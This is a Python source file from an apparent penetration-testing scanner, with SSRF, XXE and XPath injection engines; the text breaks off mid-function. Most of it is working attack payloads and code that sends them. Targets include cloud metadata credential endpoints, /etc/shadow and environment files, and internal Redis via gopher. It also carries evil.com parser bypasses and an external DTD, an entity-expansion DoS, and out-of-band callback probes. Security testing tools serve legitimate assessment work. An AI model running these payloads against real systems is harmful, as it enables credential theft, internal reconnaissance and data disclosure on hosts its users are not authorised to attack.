# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""
合并网络协议引擎模块
功能：SSRF、XXE、GraphQL 漏洞检测
"""

import re
import ssl
import time
import asyncio
import datetime
import json
import random
from urllib.parse import urlparse

from vulnclaw.core.utils import async_get, async_post, build_attack_url

try:  # dnspython 为可选依赖：缺失时 DNS/邮件安全引擎自动跳过，不影响其它检测
    import dns.resolver
    import dns.query
    import dns.zone

    DNS_AVAILABLE = True
except Exception:  # pragma: no cover - 环境未安装 dnspython
    DNS_AVAILABLE = False

from vulnclaw.core.logger import logger
from vulnclaw.core.settings import settings
from vulnclaw.engines.base import BaseEngine
from typing import Dict, List, Optional, Tuple


# ============================================================

# 从 ssrf.py 合并


# ============================================================

# engines/ssrf.py
"""
SSRF（服务端请求伪造）检测引擎 - 重构版

功能：
1. SSRF 参数探测（url, path, redirect, callback 等）
2. 内网 IP 探测（127.0.0.1, 10.0.0.1, 172.16.0.1, 192.168.1.1）
3. 云元数据探测（169.254.169.254, 100.100.100.200）
4. 协议探测（file://, dict://, gopher://, ftp://）
5. 端口扫描探测（内网服务发现）
6. WAF 绕过

检测流程：
1. 快速探测：识别可能的 SSRF 参数
2. 逐个测试 Payload
3. 检测响应特征（云元数据、内网IP、文件内容）
4. WAF 检测与绕过
"""


class SSRFEngine(BaseEngine):
    """SSRF 服务端请求伪造检测引擎"""

    name = "ssrf"
    description = "SSRF 服务端请求伪造检测引擎"

    # 优先测试的参数名
    priority_params = [
        "url", "path", "redirect", "redirect_uri", "callback", "return",
        "next", "goto", "src", "source", "file", "load", "fetch",
        "proxy", "dest", "target", "link", "href", "image", "img",
        "avatar", "profile_picture", "photo", "cover", "thumbnail",
        "download", "export", "import", "backup", "restore",
        "webhook", "callback_url", "return_url", "success_url",
        "failure_url", "error_url", "cancel_url"
    ]

    # ===== SSRF Payload =====
    payloads = [
        # ===== 内网 IP 探测 =====
        ("http://127.0.0.1", "localhost"),
        ("http://127.0.0.1:80", "localhost:80"),
        ("http://127.0.0.1:8080", "localhost:8080"),
        ("http://127.0.0.1:443", "localhost:443"),
        ("http://0.0.0.0", "0.0.0.0"),
        ("http://localhost", "localhost域名"),
        ("http://localhost:8080", "localhost域名:8080"),
        ("http://[::1]", "IPv6 localhost"),
        ("http://[::1]:8080", "IPv6 localhost:8080"),

        # ===== 内网 IP 段 =====
        ("http://10.0.0.1", "10.0.0.1"),
        ("http://10.0.0.1:80", "10.0.0.1:80"),
        ("http://10.0.0.2", "10.0.0.2"),
        ("http://172.16.0.1", "172.16.0.1"),
        ("http://172.17.0.1", "172.17.0.1"),
        ("http://172.18.0.1", "172.18.0.1"),
        ("http://192.168.1.1", "192.168.1.1"),
        ("http://192.168.1.1:80", "192.168.1.1:80"),
        ("http://192.168.0.1", "192.168.0.1"),
        ("http://192.168.100.1", "192.168.100.1"),

        # ===== 云元数据 =====
        ("http://169.254.169.254/latest/meta-data/", "AWS元数据"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM凭证"),
        ("http://169.254.169.254/latest/user-data/", "AWS用户数据"),
        ("http://169.254.169.254/latest/dynamic/instance-identity/", "AWS实例身份"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP元数据"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "GCP服务账号"),
        ("http://100.100.100.200/latest/meta-data/", "阿里云元数据"),
        ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "阿里云RAM凭证"),
        ("http://169.254.169.254/metadata/instance?api-version=2017-08-01", "Azure元数据"),
        ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack元数据"),
        ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/", "AWS EC2凭证"),
        ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS本地IP"),
        ("http://169.254.169.254/latest/meta-data/public-ipv4", "AWS公网IP"),
        ("http://169.254.169.254/latest/meta-data/hostname", "AWS主机名"),

        # ===== 文件协议 =====
        ("file:///etc/passwd", "file协议-passwd"),
        ("file:///etc/hosts", "file协议-hosts"),
        ("file:///proc/self/environ", "file协议-environ"),
        ("file:///c:/windows/win.ini", "file协议-win.ini"),
        ("file:///etc/shadow", "file协议-shadow"),
        ("file:///var/log/apache/access.log", "file协议-apache日志"),
        ("file:///var/log/nginx/access.log", "file协议-nginx日志"),

        # ===== 其他协议 =====
        ("dict://127.0.0.1:6379/info", "dict协议-Redis"),
        ("dict://127.0.0.1:3306", "dict协议-MySQL"),
        ("dict://127.0.0.1:5432", "dict协议-PostgreSQL"),
        ("gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a", "gopher协议-Redis"),
        ("ftp://127.0.0.1", "ftp协议"),
        ("ftp://127.0.0.1:21", "ftp协议:21"),
        ("ftp://anonymous:anonymous@127.0.0.1", "ftp匿名登录"),
        ("http://localhost:9200", "Elasticsearch"),
        ("http://localhost:5601", "Kibana"),
        ("http://localhost:9090", "Prometheus"),
        ("http://localhost:3000", "Grafana"),
        ("http://localhost:8080/actuator/env", "Spring Actuator"),
        ("http://localhost:8080/druid/index.html", "Druid监控"),

        # ===== URL 绕过 =====
        ("http://127.0.0.1@evil.com", "@绕过"),
        ("http://evil.com@127.0.0.1", "@绕过反向"),
        ("http://127.0.0.1#evil.com", "#绕过"),
        ("http://127.0.0.1.evil.com", "域名伪装"),
        ("http://127.0.0.1%23evil.com", "%23绕过"),
        ("http://127.0.0.1%2f..", "路径绕过"),
        ("http://127.0.0.1/../evil.com", "目录绕过"),
        ("http://127.0.0.1:80@evil.com", "端口绕过"),

        # ===== 内网端口扫描 =====
        ("http://127.0.0.1:22", "SSH端口"),
        ("http://127.0.0.1:3306", "MySQL端口"),
        ("http://127.0.0.1:5432", "PostgreSQL端口"),
        ("http://127.0.0.1:6379", "Redis端口"),
        ("http://127.0.0.1:27017", "MongoDB端口"),
        ("http://127.0.0.1:9200", "Elasticsearch端口"),
        ("http://127.0.0.1:9092", "Kafka端口"),
        ("http://127.0.0.1:2181", "Zookeeper端口"),
        ("http://127.0.0.1:11211", "Memcached端口"),
    ]

    # ===== SSRF 响应特征 =====
    SSRF_INDICATORS = [
        # 云元数据特征
        'ami-id', 'instance-id', 'public-keys', 'security-credentials',
        'meta-data', 'user-data', 'instance-identity',
        'computeMetadata', 'project-id', 'service-accounts',
        'ram/security-credentials', 'instance', 'api-version',

        # 内网服务特征
        'Redis', 'redis_version', 'MySQL', 'PostgreSQL', 'MongoDB',
        'Elasticsearch', 'Kibana', 'Prometheus', 'Grafana',
        'Druid', 'Stat Monitor', 'Zookeeper', 'Kafka',

        # 文件内容特征
        'root:', 'nobody:', 'daemon:', 'bin:',
        'Windows Registry', 'HKEY_LOCAL_MACHINE',
        '127.0.0.1', 'localhost',

        # 协议特征
        'ssh-rsa', 'SSH', 'ssh',
        '220', 'HELO', 'EHLO',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        检测 SSRF 漏洞

        检测流程：
        1. 快速探测：识别可能的 SSRF 参数
        2. 逐个测试 Payload
        3. 检测响应特征
        4. WAF 检测与绕过
        """
        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, _normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        # ===== 1. 快速探测：识别 SSRF 参数 =====
        if not await self._is_ssrf_param(url, param, parsed_query, session):
            self.log_debug(f"参数 {param} 不像是 SSRF 参数，跳过检测")
            return None

        # ===== 2. 获取 Payload =====
        payloads = self.reorder_payloads_by_param(param)

        # 如果是静态资源，减少 Payload
        if is_static:
            payloads = payloads[:8]

        # ===== 2.5 OOB 盲打通道（Interactsh，⑦）=====
        # 注入 http://<scanid>.<interactsh-domain>/ 到 url/redirect/file 参数，
        # DNS/HTTP 轮询命中即确认真 SSRF（不依赖响应回显，天然抗 WAF/CDN 过滤）
        interactsh_domain = kwargs.get('interactsh_domain', None)
        if interactsh_domain:
            oob_finding = await self._test_ssrf_oob(
                url, param, parsed_query, session, interactsh_domain
            )
            if oob_finding:
                return oob_finding

        # ===== 3. 主检测循环 =====
        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                # ===== 检测 WAF =====
                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                # ===== 检测 SSRF 响应特征 =====
                if self._has_ssrf_indicator(text):
                    evidence = self._extract_ssrf_evidence(text, payload)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF({desc})',
                        'ai_verdict': '高',
                        'evidence': evidence,
                        'diff_ratio': 0.5
                    }

                # ===== 检测云元数据 =====
                if self._is_cloud_metadata(text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF-云元数据({desc})',
                        'ai_verdict': '高',
                        'evidence': f"检测到云元数据: {self._extract_cloud_metadata(text)}",
                        'diff_ratio': 0.5,
                        'cloud_metadata': True
                    }

                # ===== 检测响应长度异常 =====
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.3
                )
                if has_diff and len(text) > 100:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SSRF-疑似({desc})',
                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"SSRF 检测异常 {param}: {e}")

        return None

    async def _is_ssrf_param(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> bool:
        """判断参数是否可能用于 SSRF"""
        # 检查参数名
        for p in self.priority_params:
            if p == param.lower():
                return True

        # 尝试简单的 SSRF 探测
        try:
            test_payload = "http://127.0.0.1:8080"
            test_url = build_attack_url(url, param, test_payload, parsed_query)
            resp = await async_get(test_url, session=session, timeout=5)

            if isinstance(resp, tuple):
                text = resp[1]
            else:
                text = await resp.text()

            # 如果响应中包含 URL 相关关键词，可能是 SSRF
            url_keywords = ['http', 'url', 'redirect', 'location', 'fetch']
            if any(kw in text.lower() for kw in url_keywords):
                return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return True

    def _has_ssrf_indicator(self, text: str) -> bool:
        """检测 SSRF 响应特征"""
        text_lower = text.lower()
        for indicator in self.SSRF_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_ssrf_evidence(self, text: str, payload: str) -> str:
        """提取 SSRF 证据"""
        # 提取 Payload 中的域名/IP
        url_match = re.search(r'http://([^/\s"\']+)', payload)
        if url_match:
            target = url_match.group(1)
            if target in text:
                return f"响应中包含目标地址: {target}"

        # 提取云元数据特征
        for indicator in ['ami-id', 'instance-id', 'meta-data', 'user-data']:
            if indicator in text:
                lines = text.split('\n')
                for line in lines:
                    if indicator in line:
                        return line[:200]

        return text[:200]

    def _is_cloud_metadata(self, text: str) -> bool:
        """检测是否为云元数据响应"""
        cloud_indicators = [
            'ami-id', 'instance-id', 'security-credentials',
            'meta-data', 'user-data', 'instance-identity',
            'computeMetadata', 'project-id', 'service-accounts',
            'ram/security-credentials'
        ]
        text_lower = text.lower()
        for indicator in cloud_indicators:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_cloud_metadata(self, text: str) -> str:
        """提取云元数据内容"""
        lines = text.split('\n')
        result = []
        for line in lines:
            if any(kw in line.lower() for kw in ['ami-id', 'instance-id', 'meta-data', 'user-data']):
                result.append(line)
            if len(result) >= 5:
                break
        return '\n'.join(result[:5]) if result else text[:200]

    # ============================================================
    # OOB 盲打通道（Interactsh，⑦）
    # ============================================================
    OOB_PAYLOADS = [
        ("http://{scan_id}.{domain}/", "OOB-DNS/HTTP外带"),
        ("http://{scan_id}.{domain}/ssrf-probe", "OOB-HTTP路径探测"),
        ("http://{scan_id}.{domain}:80/?q=1", "OOB-HTTP带参探测"),
        ("https://{scan_id}.{domain}/", "OOB-HTTPS外带"),
    ]

    def _gen_scan_token(self) -> str:
        """生成短且唯一的 scan_id 用于 OOB 命中配对"""
        return f"sr{random.randint(100000, 999999)}"

    async def _test_ssrf_oob(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session,
        interactsh_domain: str
    ) -> Optional[Dict]:
        """OOB 盲打：向 url/redirect/file 参数注入 http://<scanid>.<interactsh-domain>/

        判定逻辑：
        1. 注入唯一 scan_id 前缀域名，后端若发起请求会触发 DNS 解析与 HTTP 回调；
        2. 短轮询 Interactsh，命中（DNS/HTTP 回调包含 scan_id）即确认真 SSRF；
        3. 未命中返回 None，交由 verify 阶段 do_oob_poll 钩子做长轮询确认。
        """
        if not interactsh_domain:
            return None

        from vulnclaw.modules.vuln_scanner.oob_interactsh import get_interactsh_poll

        scan_id = self._gen_scan_token()
        # 命中与扫描周期隔离：OOB 命中记录以 scan_id 前缀标识
        oob_records = []

        for oob_payload, desc in self.OOB_PAYLOADS:
            oob_url = oob_payload.format(scan_id=scan_id, domain=interactsh_domain)
            attack_url = build_attack_url(url, param, oob_url, parsed_query)
            try:
                # 禁跟随重定向：目标若把 url/redirect 参数反射进 Location，
                # 扫描器自身跟随 302 会主动请求 OOB 地址，产生"自回调"并误判实锤。
                resp = await async_get(attack_url, session=session, timeout=10, no_retry=True, allow_redirects=False)
                # OOB 不依赖响应回显：只要请求被服务端处理即可
                if isinstance(resp, tuple):
                    oob_records.append((oob_url, resp[0]))
            except Exception as e:
                logger.debug(f"SSRF OOB 请求失败 {oob_url}: {e}")

        if not oob_records:
            return None

        # 短轮询（复用 verify 阶段的 Interactsh 通道）
        try:
            interactions = await asyncio.wait_for(
                get_interactsh_poll(interactsh_domain, timeout=8), timeout=10
            )
        except Exception as e:
            logger.debug(f"SSRF OOB 轮询失败: {e}")
            interactions = []

        for inter in interactions:
            if not isinstance(inter, dict):
                continue
            raw = str(inter.get("raw-request", ""))
            details = str(inter.get("q-type", "")) + " " + str(inter.get("protocol", ""))
            if scan_id in raw or scan_id in details:
                return {
                    'url': url,
                    'parameter': param,
                    'payload': oob_url,
                    'type': f'SSRF-OOB盲打确认({desc})',
                    'severity': 'High',
                    'ai_verdict': '高',
                    'confidence': 'high',
                    'evidence': (
                        f"Interactsh 命中 scan_id={scan_id}（{'DNS' if inter.get('q-type') else 'HTTP'}回调）: "
                        f"{raw[:200]}"
                    ),
                    'diff_ratio': 0.9,
                    'oob_confirmed': True,
                    'method': 'oob_ssrf'
                }

        # 短轮询未命中 → 返回 OOB-pending finding，交由 verify 阶段长轮询按 scan_id 配对确认
        # 只有"请求确实发出成功"的探测才产生 pending（防止不可达参数刷报告）
        if not oob_records:
            return None
        return {
            'url': url,
            'parameter': param,
            'payload': oob_records[0][0],
            'type': 'SSRF-OOB盲打待确认(DNS/HTTP外带)',
            'severity': 'Medium',
            'ai_verdict': '中（待OOB确认）',
            'confidence': 'low',
            'evidence': (
                f"已向参数 {param} 注入 Interactsh 探测域名，等待 DNS/HTTP 回调"
                f"（scan_id={scan_id}）"
            ),
            'diff_ratio': 0.3,
            'oob_pending': True,
            'oob_scan_id': scan_id,
            'oob_domain': interactsh_domain,
            'method': 'oob_ssrf'
        }

    # ============================================================
    # 内网端口扫描（增强版）
    # ============================================================

    async def scan_internal_ports(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session,
        ports: List[int] = None
    ) -> List[Dict]:
        """
        通过 SSRF 扫描内网端口

        参数:
            url: 目标 URL
            param: SSRF 参数名
            parsed_query: 原始查询字符串
            session: aiohttp ClientSession
            ports: 要扫描的端口列表
        """
        if ports is None:
            ports = [22, 80, 443, 3306, 5432, 6379, 27017, 9200, 9092, 2181, 11211]

        findings = []

        for port in ports:
            payload = f"http://127.0.0.1:{port}"
            test_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(test_url, session=session, timeout=5)

                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                if status < 400 and len(text) > 10:
                    # 检测服务特征
                    service = self._detect_service_by_banner(text, port)
                    findings.append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'port': port,
                        'service': service,
                        'type': f'SSRF-内网服务发现({service})',
                        'ai_verdict': '中',
                        'evidence': f"端口 {port} 可访问，服务: {service}",
                        'diff_ratio': 0.5
                    })
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        return findings

    def _detect_service_by_banner(self, text: str, port: int) -> str:
        """根据 Banner 和端口检测服务类型"""
        text_lower = text.lower()

        # 基于端口
        port_service_map = {
            22: 'SSH',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            27017: 'MongoDB',
            9200: 'Elasticsearch',
            9092: 'Kafka',
            2181: 'Zookeeper',
            11211: 'Memcached',
            80: 'HTTP',
            443: 'HTTPS',
            8080: 'HTTP-Alt',
        }

        # 基于 Banner
        banner_map = {
            'ssh': 'SSH',
            'mysql': 'MySQL',
            'postgresql': 'PostgreSQL',
            'redis': 'Redis',
            'mongodb': 'MongoDB',
            'elasticsearch': 'Elasticsearch',
            'kafka': 'Kafka',
            'zookeeper': 'Zookeeper',
            'memcached': 'Memcached',
        }

        for banner, service in banner_map.items():
            if banner in text_lower:
                return service

        return port_service_map.get(port, 'Unknown')


# ============================================================
# 导出
# ============================================================
__all__ = ['SSRFEngine', 'XXEEngine', 'GraphQLEngine', 'TlsSecurityEngine', 'DnsSecurityEngine']


# ============================================================

# 从 xxe.py 合并


# ============================================================

# engines/xxe.py
"""
XXE（XML外部实体注入）检测引擎 - 重构版
功能：
1. XML 内容检测
2. XXE Payload 注入（文件读取、内网探测）
3. 响应分析（文件内容、错误信息）
4. WAF 绕过
5. XPath 注入检测（增强）
"""


class XXEEngine(BaseEngine):
    name = "xxe"
    description = "XXE XML外部实体注入检测引擎"

    priority_params = [
        "xml", "data", "payload", "body", "content",
        "soap", "wsdl", "xsd", "dtd", "entity",
        "document", "request", "message", "envelope"
    ]

    payloads = [
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "Linux passwd"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>', "Linux hosts"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', "Linux shadow"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', "Windows win.ini"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>', "Windows hosts"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>', "Linux environ"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>', "内网HTTP探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', "AWS元数据探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/">]><root>&xxe;</root>', "GCP元数据探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>', "参数实体-passwd"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/">%xxe;]><root/>', "参数实体-HTTP"),
        ('<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://evil.com/xxe.dtd"><root>&xxe;</root>', "外部DTD"),
        ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "UTF-8编码"),
        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "UTF-16编码"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>', "PHP Base64编码"),
        ('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', "XInclude passwd"),
        ('<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://127.0.0.1:80/"/></root>', "XInclude HTTP"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{{interactsh-domain}}">]><root>&xxe;</root>', "SSRF外带"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0ainfo%0d%0a">]><root>&xxe;</root>', "gopher协议-Redis"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">]><root>&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;</root>', "实体爆炸-DoS"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>', "错误信息探测"),
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:9999/">]><root>&xxe;</root>', "端口探测"),
    ]

    XXE_INDICATORS = [
        'root:', 'nobody:', 'daemon:', 'bin:', 'sys:',
        'games:', 'man:', 'lp:', 'mail:', 'news:',
        '[boot loader]', '[operating systems]',
        'Windows Registry', 'HKEY_LOCAL_MACHINE',
        '<?php', '<?xml', 'DB_PASSWORD', 'SECRET_KEY',
        'java.io.FileNotFoundException',
        'No such file or directory',
        'Cannot find the declaration of element',
        'Entity not found',
        'XML parsing error',
        'DOCTYPE', 'ENTITY', 'SYSTEM',
        'Connection refused',
        'Connection timed out',
        'Unknown host',
        'ami-id', 'instance-id', 'meta-data',
        'computeMetadata', 'project-id',
        'Redis', 'MySQL', 'PostgreSQL', 'MongoDB',
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)
        interactsh_domain = kwargs.get('interactsh_domain', None)

        if not await self._is_xml_target(url, param, normal_text, session):
            self.log_debug(f"目标 {url} 不像是 XML 接口，跳过 XXE 检测")
            return None

        payloads = self.reorder_payloads_by_param(param)

        if interactsh_domain:
            processed_payloads = []
            for payload, desc in payloads:
                if '{{interactsh-domain}}' in payload:
                    new_payload = payload.replace('{{interactsh-domain}}', interactsh_domain)
                    processed_payloads.append((new_payload, f"{desc}(外带)"))
                else:
                    processed_payloads.append((payload, desc))
            payloads = processed_payloads

        if is_static:
            payloads = payloads[:8]

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            content_types = [
                'application/xml',
                'text/xml',
                'application/soap+xml',
                'application/x-www-form-urlencoded',
            ]

            for content_type in content_types[:2]:
                try:
                    headers = {'Content-Type': content_type}

                    if '?' in url or param:
                        attack_url = build_attack_url(url, param, payload, parsed_query)
                        resp = await async_get(attack_url, session=session, headers=headers, timeout=settings.timeout)
                    else:
                        # 尝试直接POST XML，同时也尝试JSON包裹的XML
                        resp = await async_post(
                            url,
                            data=payload,
                            headers=headers,
                            session=session,
                            timeout=settings.timeout
                        )
                        # 如果post失败，尝试JSON格式
                        if isinstance(resp, tuple) and resp[0] >= 400:
                            json_payload = {"xml": payload}
                            resp = await async_post(
                                url,
                                json=json_payload,
                                headers={'Content-Type': 'application/json'},
                                session=session,
                                timeout=settings.timeout
                            )

                    if isinstance(resp, tuple):
                        status, text = resp[0], resp[1]
                    else:
                        status, text = resp.status, await resp.text()

                    waf_type = await self.detect_waf(text)
                    if waf_type:
                        self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                        bypass_result = await self.try_waf_bypass(
                            url, param, payload, parsed_query, session,
                            waf_type, normal_resp
                        )
                        if bypass_result:
                            return bypass_result
                        continue

                    if self._has_xxe_indicator(text):
                        evidence = self._extract_xxe_evidence(text, payload)
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE({desc})',
                            'ai_verdict': '高',
                            'evidence': evidence,
                            'diff_ratio': 0.5
                        }

                    if self._is_base64_content(text):
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE-Base64编码({desc})',
                            'ai_verdict': '高',
                            'evidence': f"检测到 Base64 编码内容: {text[:100]}...",
                            'diff_ratio': 0.5,
                            'base64_encoded': True
                        }

                    has_diff, diff_ratio = self.has_response_diff(
                        normal_resp,
                        (status, text, {}),
                        threshold=0.3
                    )
                    if has_diff and len(text) > 100:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XXE-疑似({desc})',
                            'ai_verdict': '中',
                            'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                            'diff_ratio': diff_ratio
                        }

                except Exception as e:
                    self.log_debug(f"XXE 检测异常 {param}: {e}")

        return None

    async def _is_xml_target(self, url: str, param: str, normal_text: str, session) -> bool:
        xml_params = ['xml', 'data', 'payload', 'soap', 'wsdl', 'xsd', 'dtd']
        if any(p in param.lower() for p in xml_params):
            return True

        try:
            resp = await async_get(url, session=session, timeout=5)
            if isinstance(resp, tuple):
                headers = resp[2] if len(resp) > 2 else {}
            else:
                headers = resp.headers
            content_type = headers.get('Content-Type', '')
            if 'xml' in content_type.lower() or 'soap' in content_type.lower():
                return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        if normal_text and ('<?xml' in normal_text or '<soap' in normal_text.lower()):
            return True

        return False

    def _has_xxe_indicator(self, text: str) -> bool:
        text_lower = text.lower()
        for indicator in self.XXE_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_xxe_evidence(self, text: str, payload: str) -> str:
        file_indicators = ['root:', 'nobody:', 'daemon:', 'bin:', 'sys:', 'games:', 'man:', 'lp:', 'mail:', 'news:']
        for indicator in file_indicators:
            if indicator in text:
                lines = text.split('\n')
                for line in lines:
                    if indicator in line:
                        return line[:200]

        error_indicators = ['java.io.FileNotFoundException', 'No such file', 'Connection refused']
        for indicator in error_indicators:
            if indicator in text:
                start = max(0, text.find(indicator) - 20)
                end = min(len(text), text.find(indicator) + 100)
                return text[start:end]

        return text[:200]

    def _is_base64_content(self, text: str) -> bool:
        base64_pattern = r'^[A-Za-z0-9+/=]+$'
        lines = text.split('\n')
        base64_lines = 0
        for line in lines:
            line = line.strip()
            if len(line) > 20 and re.match(base64_pattern, line):
                base64_lines += 1
                if base64_lines > 3:
                    return True
        return False

    async def check_xpath_injection(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session
    ) -> Optional[Dict]:
        if not await self._is_xml_target(url, param, normal_resp[1] if isinstance(normal_resp, tuple) else '', session):
            return None

        xpath_payloads = [
            ("' OR '1'='1", "XPath OR注入"),
            ("' OR 1=1 OR '1'='1", "XPath OR注入2"),
            ("' or 'a'='a", "XPath OR注入3"),
            ("']|//*|/*|//*", "XPath Union"),
            ("'] | //* | /*", "XPath Union2"),
            ("' and 1=1 and '1'='1", "XPath AND注入"),
            ("' and 1=2 and '1'='1", "XPath AND注入2"),
            ("' or position()=1", "XPath位置注入"),
            ("' or count(/*)=1", "XPath计数注入"),
            ("' or substring(//user[1]/password,1,1)='a", "XPath布尔盲注"),
        ]

        for payload, desc in xpath_payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)
                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()

                xpath_errors = [
                    'XPath', 'xpath',
                    'Invalid predicate',
                    'Invalid expression',
                    'Axis name',
                    'Invalid token',
                    'Unclosed',
                ]

                for error in xpath_errors:
                    if error.lower() in text.lower():
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'XPath注入({desc})',
                            'ai_verdict': '高',
                            'evidence': f"检测到 XPath 错误: {error}",
                            'diff_ratio': 0.5
                        }

                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.2
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'XPath注入-疑似({desc})',
